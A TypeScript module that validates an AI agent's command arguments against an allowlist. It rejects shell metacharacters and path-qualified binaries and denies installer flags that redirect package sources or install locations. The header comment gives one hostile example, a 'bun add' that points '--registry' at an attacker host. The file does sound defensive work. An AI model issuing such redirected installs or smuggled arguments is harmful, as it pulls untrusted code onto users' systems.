/**
 * The two refusals that bracket the grant match for a model-authored argv.
 *
 * `validateArgv` runs FIRST, before any pattern matching, so a malformed
 * token can never be admitted by a `*` in a grant — the allowlist matches
 * argv shapes, and a shape check must reject garbage before a wildcard gets
 * a chance to wave it through. `deniedFlag` runs AFTER the grant match,
 * because a prefix grant (e.g. `bun add*`) gates the verb, not the payload:
 * `bun add x --registry https://attacker.example` still satisfies `bun add*`
 * while quietly changing where the installed code comes from. The verb gate
 * cannot see that — only a payload-aware check after the match can.
 *
 * Do not reorder these two checks, and do not merge them into one pass:
 * a later reader who "simplifies" this into a single sweep silently
 * removes the guarantee that garbage never reaches the allowlist.
 */

// Shell metacharacters that would let an argv element break out of "one
// literal argument" and be reinterpreted by a shell or a naive re-parse
// downstream — even though this path never invokes a shell itself, nothing
// downstream may assume these are absent.
const METACHARACTERS = /[;&|$`()<>\n\r]/;

export function validateArgv(argv: unknown): string | undefined {
  if (!Array.isArray(argv)) return "argv must be an array of strings";
  if (argv.length === 0) return "argv must not be empty";
  for (const element of argv) {
    if (typeof element !== "string") return "every argv element must be a string";
    if (element.length === 0) return "argv elements must not be empty";
    if (METACHARACTERS.test(element)) return `argv element contains a shell metacharacter: ${element}`;
    // A leading "~" depends on shell expansion this path never performs, so
    // it would silently resolve to nothing (or to the wrong home directory)
    // rather than to what the model intended.
    if (element.startsWith("~")) return `argv element must not start with "~": ${element}`;
  }
  // argv[0] is the binary. It must resolve through PATH, not through a
  // relative or absolute path — a path lets the model point execution at an
  // arbitrary file it just wrote, which is exactly what the allowlist of
  // known verbs (bun, npm, pip, ...) exists to prevent. This check runs on
  // argv[0] like every other element above, not only on the arguments that
  // follow it — a binary-only exemption would leave a hole an allowlist
  // grant could never close.
  const binary = argv[0] as string;
  if (binary.includes("/") || binary.includes("\\")) {
    return `the command must resolve through PATH, not a path: ${binary}`;
  }
  return undefined;
}

/**
 * Flags that redirect where code comes from or where it lands.
 *
 * Not a general "unsafe flag" list — it is specifically the set a verb gate
 * cannot see. A prefix grant like `npm install*` approves the verb "install
 * a package the model named"; it says nothing about `--registry`,
 * `--index-url`, `-g`/`--global`, `--prefix`, or `--config`/`--userconfig`,
 * each of which can point the installer at a different source or a
 * different filesystem location entirely. `--unsafe-perm` is here for the
 * same reason from the other direction: it removes a safety check on what
 * an installed package's scripts are allowed to do. These are enumerated,
 * not pattern-matched, because the point is precisely that no verb pattern
 * can be trusted to imply their absence.
 */
export const DENIED_FLAGS: readonly string[] = [
  "--registry",
  "--index-url",
  "--index",
  "-i",
  "--config",
  "--userconfig",
  "--global",
  "-g",
  "--prefix",
  "--unsafe-perm",
];

export function deniedFlag(argv: readonly string[]): string | undefined {
  for (const element of argv) {
    // Normalize "--flag=value" to "--flag" so the denylist check does not
    // depend on whether the model wrote the value as a separate token.
    const name = element.includes("=") ? (element.split("=")[0] as string) : element;
    if (DENIED_FLAGS.includes(name)) return name;
  }
  return undefined;
}
